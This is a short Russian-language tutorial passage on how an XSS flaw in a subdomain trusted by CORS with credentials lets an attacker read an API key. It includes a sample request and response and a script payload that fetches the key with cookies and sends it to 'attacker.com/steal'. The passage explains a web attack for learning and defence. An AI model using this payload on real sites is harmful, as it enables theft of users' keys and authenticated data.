Даже «правильно» настроенный CORS устанавливает доверительные отношения между двумя источниками. Если веб-сайт доверяет источнику, который уязвим для межсайтового скриптинга ( XSS ), то злоумышленник может использовать XSS для внедрения некоторого JavaScript, который использует CORS для получения конфиденциальной информации с сайта, который доверяет уязвимому приложению.

Учитывая следующий запрос:
```
GET /api/requestApiKey HTTP/1.1 
Host: vulnerable-website.com 
Origin: https://subdomain.vulnerable-website.com 
Cookie: sessionid=...
```

Если сервер отвечает:
```
HTTP/1.1 200 OK 
Access-Control-Allow-Origin: https://subdomain.vulnerable-website.com 
Access-Control-Allow-Credentials: true
```

Затем злоумышленник, обнаруживший уязвимость XSS, `subdomain.vulnerable-website.com`может использовать ее для получения ключа API, используя URL-адрес следующего вида:
```
<script>
  fetch('https://vulnerable-website.com/api/requestApiKey', {
    credentials: 'include'  // Отправляем куки
  })
  .then(response => response.text())
  .then(data => {
    // Отправляем данные на сервер злоумышленника
    fetch('https://attacker.com/steal?data=' + encodeURIComponent(data));
  });
</script>
```
- Этот код выполнится в браузере жертвы, если есть XSS на `subdomain.vulnerable-website.com`.
- Так как домен доверенный, CORS разрешит запрос.
- API вернёт данные (например, ключ API), которые отправятся злоумышленнику.

- **CORS доверяет `subdomain.vulnerable-website.com`** → запросы с него разрешены.
- **XSS позволяет выполнить произвольный JS** → злоумышленник может отправить запрос от имени жертвы.
- **Куки включаются (`credentials: true`)** → запрос идёт с авторизацией.


